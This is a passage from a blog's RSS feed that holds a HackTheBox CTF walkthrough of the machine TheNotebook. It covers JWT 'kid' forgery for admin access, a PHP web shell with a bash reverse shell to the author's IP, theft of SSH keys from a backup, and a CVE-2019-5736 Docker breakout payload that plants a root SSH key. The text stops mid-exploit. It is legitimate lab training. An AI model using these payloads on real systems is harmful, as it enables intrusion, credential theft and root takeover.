<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Docker on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/docker/</link>
    <description>Recent content in Docker on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 07 Aug 2021 21:07:15 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/docker/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - TheNotebook</title>
      <link>https://fahmifj.github.io/hackthebox/thenotebook/</link>
      <pubDate>Sat, 07 Aug 2021 21:07:15 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/thenotebook/</guid>
      <description>Abusing JWT key identifier and breaking out of a Docker container</description>
      <content:encoded><![CDATA[<p>TheNotebook from Hack The Box hosts a web-based note application and it uses a JWT token for its authentication cookie. The token can be forged to escalate myself to admin. With admin-level access, it is possible to drop a PHP web shell using the upload functionality, resulting in shell access to the system. Enumerating on the system discovers a backup file that contains SSH keys of a user. The user is allowed run a Docker container with <code>sudo</code> permissions. The Docker version in this machine is vulnerable to CVE-2019-5736. Along with the <code>sudo</code> permissions, the Docker vulnerability can be exploited to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>JWT Key ID</li>
<li>Docker breakout using CVE-2019-573</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li><a href="https://jwt.io">https://jwt.io</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan discovers two open ports, SSH on port 22 and a NGINX web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.10.230 thenotebook
</span></span><span class="line"><span class="cl">nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> 10.10.10.230 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p22,80,10010 -sC -sV -oA nmap/10-tcp-allport-thenotebook 10.10.10.230
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-07 02:29 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.230
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.10s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE    SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp    open     http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: The Notebook - Your Note Keeper
</span></span><span class="line"><span class="cl">10010/tcp filtered rxapi
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.67 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>On port 80, the machine hosts a web application called &ldquo;The Notebook&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210807133719995.png" alt="image-20210807133719995"  /></div>
</p>
<p>I tried some default credentials on the login page, but no luck, so I will just register an account.</p>
<p><div class="img-container"><img src="imgs/image-20210807134833301.png" alt="image-20210807134833301"  /></div>
</p>
<p>And the site automatically logs me in.</p>
<p><div class="img-container"><img src="imgs/image-20210807135132964.png" alt="image-20210807135132964"  /></div>
</p>
<p>I can create a note on <code>/notes</code>. I will setup a Python web server and I add a note that contains my HTB IP. Unfortunately, there is no incoming request on my web server.</p>
<p><div class="img-container"><img src="imgs/image-20210807135517614.png" alt="image-20210807135517614"  /></div>
</p>
<p>My note has link of <code>10.10.10.230/f5379278-9969-4a8e-8fa5-969ec9ebf525/notes/8</code>. Because the second path looks like a GUID which is unique, so I think the attack is not an IDOR.</p>
<p>Although, I said it&rsquo;s not an IDOR, I have a cool trick to share:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
</span></span><span class="line"><span class="cl">$ curl -sI 10.10.10.230/f5379278-9969-4a8e-8fa5-969ec9ebf525/notes/<span class="o">{</span>7..8<span class="o">}</span>
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">401</span> UNAUTHORIZED
</span></span><span class="line"><span class="cl">Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Date: Sat, <span class="m">07</span> Aug <span class="m">2021</span> 07:07:48 GMT
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">12</span>
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Date: Sat, <span class="m">07</span> Aug <span class="m">2021</span> 07:07:49 GMT
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">1710</span>
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span></code></pre></div><h4 id="gobuster">Gobuster</h4>
<p>Running a <code>gobuster</code> scan reveals that there is an admin page (<code>/admin</code>), but I have no access there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://10.10.10.230/ -w /opt/SecLists/Discovery/Web-Content/common.txt -x txt -o gobuster/gobuster-S-80 -t <span class="nv">40</span> 
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.230/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">40</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/08/07 02:44:26 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/admin                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 9<span class="o">]</span>
</span></span><span class="line"><span class="cl">/login                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1250<span class="o">]</span>
</span></span><span class="line"><span class="cl">/logout               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 209<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.10.230/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/register             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1422<span class="o">]</span>                          
</span></span><span class="line"><span class="cl">                                                                          
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/08/07 02:44:49 <span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><h4 id="playing-with-jwt-cookie">Playing with JWT Cookie</h4>
<p>While inspecting the browser storage, I find the site generates two cookie:  <code>auth</code> and <code>uuid</code>. The <code>auth</code> cookie is a JWT token.</p>
<p><div class="img-container"><img src="imgs/image-20210807141947185.png" alt="image-20210807141947185"  /></div>
</p>
<blockquote>
<p>Note: JWT token consists of header, payload, and signature that are separated by a dot and each part is encoded with base64.</p>
</blockquote>
<p>The <code>auth</code> cookie can decoded using <a href="https://jwt.io/">jwt.io</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210807143329934.png" alt="image-20210807143329934"  /></div>
</p>
<p>The value of <code>kid</code> (key identifier) and <code>admin_cap</code> are interesting vectors to play with. First, I will grab the header value and decode it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9&#39;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;typ&#34;</span>:<span class="s2">&#34;JWT&#34;</span>,<span class="s2">&#34;alg&#34;</span>:<span class="s2">&#34;RS256&#34;</span>,<span class="s2">&#34;kid&#34;</span>:<span class="s2">&#34;http://localhost:7070/privKey.key&#34;</span><span class="o">}</span>
</span></span></code></pre></div><p>I can try to modify the <code>kid</code> value to point to my IP, then I will encode the header back to base64.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> -n <span class="s1">&#39;{&#34;typ&#34;:&#34;JWT&#34;,&#34;alg&#34;:&#34;RS256&#34;,&#34;kid&#34;:&#34;http://10.10.14.17/privKey.key&#34;}&#39;</span> <span class="p">|</span> base64 -w0
</span></span><span class="line"><span class="cl">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xNy9wcml2S2V5LmtleSJ9
</span></span></code></pre></div><p>I will put back the forged header to the <code>auth</code> cookie and setup a Python web server afterwards.</p>
<p>When I refresh the page, there is an incoming request for <code>privKey.key</code> to my web server.</p>
<p><div class="img-container"><img src="imgs/image-20210807151313793.png" alt="image-20210807151313793"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="escalate-to-web-admin">Escalate to web admin</h4>
<p>Since the  <code>kid</code>  value can be controlled by me, I can forge a token that has <code>admin_cap</code>  value set to <code>true</code> and so the app will look for my private key and eventually validates my forged token using that key.</p>
<p>First, I will create <code>privKey.key</code> using <code>ssh-keygen</code>. I will host this key using Python web server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.17» 
</span></span><span class="line"><span class="cl">$ ssh-keygen -t rsa -P <span class="s2">&#34;&#34;</span> -b <span class="m">4096</span> -m PEM -f privKey.key
</span></span><span class="line"><span class="cl">Generating public/private rsa key pair.
</span></span><span class="line"><span class="cl">Your identification has been saved in privKey.key
</span></span><span class="line"><span class="cl">Your public key has been saved in privKey.key.pub
</span></span><span class="line"><span class="cl">The key fingerprint is:
</span></span><span class="line"><span class="cl">SHA256:IWMd7YYOw6gQT2tpGCtbx3Iaav2yW1qs8lyYGVl90fo kali@kali
</span></span><span class="line"><span class="cl">The key<span class="err">&#39;</span>s randomart image is:
</span></span><span class="line"><span class="cl">+---<span class="o">[</span>RSA 4096<span class="o">]</span>----+
</span></span><span class="line"><span class="cl"><span class="p">|</span>        .o.      <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>o .   .. .o.     <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> B + ++.o+.      <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="o">=</span> X B.+oooo      <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>.B.X   +S..      <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>o.o.*   .  E     <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>.  +.<span class="o">=</span>           <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ...*.           <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  oB+            <span class="p">|</span>
</span></span><span class="line"><span class="cl">+----<span class="o">[</span>SHA256<span class="o">]</span>-----+
</span></span></code></pre></div><p>I will head to <a href="https://jwt.io/">jwt.io</a> to forge a new token and sign it using my <code>privKey.key</code>, and I will put this forged token to the <code>auth</code> cookie.</p>
<p><div class="img-container"><img src="imgs/image-20210807152924854.png" alt="image-20210807152924854"  /></div>
</p>
<p>When I refresh the browser, a new menu called &ldquo;Admin Panel&rdquo; pops up.</p>
<p><div class="img-container"><img src="imgs/image-20210807153522086.png" alt="image-20210807153522086"  /></div>
</p>
<p>Clicking the Admin Panel points to <code>/admin</code> where I see two options there: <code>View Notes</code> and <code>Upload File</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210807154045797.png" alt="image-20210807154045797"  /></div>
</p>
<p>The <code>View Notes</code> button links to <code>/admin/viewnotes</code>, and in this page all users&rsquo; note can be viewed by the admin.</p>
<p><div class="img-container"><img src="imgs/image-20210807154240999.png" alt="image-20210807154240999"  /></div>
</p>
<p>Two interesting notes created by the admin are titled: <code>Need to fix config</code> and <code>Backups are scheduled</code>.  The first note contains information about a security issue.</p>
<p><div class="img-container"><img src="imgs/image-20210807154529651.png" alt="image-20210807154529651"  /></div>
</p>
<p>The second note states that the server has regular backups set.</p>
<p><div class="img-container"><img src="imgs/image-20210807154537751.png" alt="image-20210807154537751"  /></div>
</p>
<p>The <code>File Upload</code> button points to <code>/admin/upload</code>. This page provides an upload functionality.</p>
<p><div class="img-container"><img src="imgs/image-20210807160019742.png" alt="image-20210807160019742"  /></div>
</p>
<h4 id="web-shell-upload">Web Shell Upload</h4>
<p>According to the note titled with <code>Need to fix config</code>, I will try to drop the following PHP code on the upload page.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span> &gt; iamf-test.php 
</span></span></code></pre></div><p>And the file gets uploaded.</p>
<p><div class="img-container"><img src="imgs/image-20210807163411701.png" alt="image-20210807163411701"  /></div>
</p>
<p>The uploaded file can be accessed at <code>http://10.10.10.230/48101bbdd897877cc62b8704a293a436.php</code>. When I visit the link, it processes the PHP code.</p>
<p><div class="img-container"><img src="imgs/image-20210807163428110.png" alt="image-20210807163428110"  /></div>
</p>
<p>I will change the payload with the following PHP reverse shell and then setup a netcat listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.17/53 0&gt;&amp;1&#39;&#34;</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>When I get the file URL, I will use <code>curl</code> to trigger the reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.230/11ee6b411f33fe8f9c49d1a02e5720b7.php
</span></span></code></pre></div><p>Now on my listener, I have an interactive shell access as <code>www-data</code> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.17<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.230<span class="o">]</span> <span class="m">39698</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1294<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@thenotebook:~/html$ 
</span></span></code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
<p>I will upgrade my shell to fully interactive one.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@thenotebook:~/html$ which script
</span></span><span class="line"><span class="cl">which script
</span></span><span class="line"><span class="cl">/usr/bin/script
</span></span><span class="line"><span class="cl">www-data@thenotebook:~/html$ script /dev/null -c bash
</span></span><span class="line"><span class="cl">script /dev/null -c bash
</span></span><span class="line"><span class="cl">Script started, file is /dev/null
</span></span><span class="line"><span class="cl">www-data@thenotebook:~/html$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">5987</span> suspended  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">5987</span> continued  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">www-data@thenotebook:~/html$ stty rows <span class="m">30</span> cols <span class="m">106</span>
</span></span><span class="line"><span class="cl">www-data@thenotebook:~/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-noah">Shell as noah</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Based on the previous admin notes, I start with enumeration of readable file that contains &ldquo;backup&rdquo; string. One that stands out is <code>/var/backups/home.tar.gz</code>. I will grab that file to my attacking machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@thenotebook:~/html$ find / -type f -readable 2&gt;/dev/null <span class="p">|</span> grep -i <span class="s2">&#34;backup&#34;</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">/var/backups/home.tar.gz
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The file contains an SSH private key for user <code>noah</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.17» 
</span></span><span class="line"><span class="cl">$ tar -zxvf home.tar.gz
</span></span><span class="line"><span class="cl">home/
</span></span><span class="line"><span class="cl">home/noah/
</span></span><span class="line"><span class="cl">home/noah/.bash_logout
</span></span><span class="line"><span class="cl">home/noah/.cache/
</span></span><span class="line"><span class="cl">home/noah/.cache/motd.legal-displayed
</span></span><span class="line"><span class="cl">home/noah/.gnupg/
</span></span><span class="line"><span class="cl">home/noah/.gnupg/private-keys-v1.d/
</span></span><span class="line"><span class="cl">home/noah/.bashrc
</span></span><span class="line"><span class="cl">home/noah/.profile
</span></span><span class="line"><span class="cl">home/noah/.ssh/
</span></span><span class="line"><span class="cl">home/noah/.ssh/id_rsa
</span></span><span class="line"><span class="cl">home/noah/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">home/noah/.ssh/id_rsa.pub
</span></span></code></pre></div><h4 id="ssh---noah">SSH - noah</h4>
<p>With the obtained private key, I can SSH login as <strong>noah</strong> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
</span></span><span class="line"><span class="cl">$ ssh -i loot/home/noah/.ssh/id_rsa noah@10.10.10.230
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-151-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System information as of Sat Aug  <span class="m">7</span> 09:57:29 UTC <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:  0.03              Processes:              <span class="m">184</span>
</span></span><span class="line"><span class="cl">  Usage of /:   46.1% of 7.81GB   Users logged in:        <span class="m">0</span>
</span></span><span class="line"><span class="cl">  Memory usage: 19%               IP address <span class="k">for</span> ens160:  10.10.10.230
</span></span><span class="line"><span class="cl">  Swap usage:   0%                IP address <span class="k">for</span> docker0: 172.17.0.1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Wed Feb <span class="m">24</span> 09:09:34 <span class="m">2021</span> from 10.10.14.5
</span></span><span class="line"><span class="cl">noah@thenotebook:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span>
</span></span></code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">noah@thenotebook:~$ cat user.txt <span class="p">|</span> sed -s <span class="s1">&#39;s/[a-f]/\*/g&#39;</span>
</span></span><span class="line"><span class="cl">*881626900**9*271**710*266*9427*
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User <strong>noah</strong> is allowed to run an interactive shell command to a container named <code>webapp-dev01</code> as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">noah@thenotebook:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> noah on thenotebook:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User noah may run the following commands on thenotebook:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01*
</span></span></code></pre></div><p>And the currently installed docker is vulnerable to CVE-2019-5736. More details about the vulnerability can be read <a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">here</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">noah@thenotebook:~$ docker version
</span></span><span class="line"><span class="cl">Client:
</span></span><span class="line"><span class="cl"> Version:           18.06.0-ce
</span></span><span class="line"><span class="cl"> API version:       1.38
</span></span><span class="line"><span class="cl"> Go version:        go1.10.3
</span></span><span class="line"><span class="cl"> Git commit:        0ffa825
</span></span><span class="line"><span class="cl"> Built:             Wed Jul <span class="m">18</span> 19:09:54 <span class="m">2018</span>
</span></span><span class="line"><span class="cl"> OS/Arch:           linux/amd64
</span></span><span class="line"><span class="cl"> Experimental:      <span class="nb">false</span>
</span></span><span class="line"><span class="cl">Got permission denied <span class="k">while</span> trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.38/version: dial unix /var/run/docker.sock: connect: permission denied
</span></span></code></pre></div><h4 id="docker-breakout-cve-2019-5736">Docker Breakout CVE-2019-5736</h4>
<p>To exploit the docker CVE-2019-5736, I will be using this <a href="https://github.com/Frichetten/CVE-2019-5736-PoC.git">PoC</a> by Frichetten. The exploit&rsquo;s author also gives a nice writeup about what the exploit does.</p>
<p>I will clone the PoC to my working directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.17» 
</span></span><span class="line"><span class="cl">$ git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git
</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;CVE-2019-5736-PoC&#39;</span>...
</span></span><span class="line"><span class="cl">remote: Enumerating objects: 45, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">remote: Total <span class="m">45</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">45</span>
</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>45/45<span class="o">)</span>, 1.69 MiB <span class="p">|</span> 254.00 KiB/s, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">Resolving deltas: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span>.
</span></span></code></pre></div><p>In the <code>main.go</code>, I will modify the payload variable with a bash script that will inject my SSH public key to root&rsquo;s <code>authorized_keys</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">payload</span> <span class="p">=</span> <span class="s">&#34;#!/bin/bash \n mkdir -p /root/.ssh/ &amp;&amp; echo &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39; &gt; /root/.ssh/authorized_keys&#34;</span>
</span></span></code></pre></div><p>I will compile the PoC and host it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «CVE-2019-5736-PoC» «10.10.14.17» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ go build -o breakout main.go <span class="o">&amp;&amp;</span> python3 -m http.server <span class="m">8080</span>
</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8080</span> <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
</span></span></code></pre></div><p>On TheNotebook, I will have two SSH sessions. On the first SSH session, I will use it to download and execute the exploit within the container.</p>
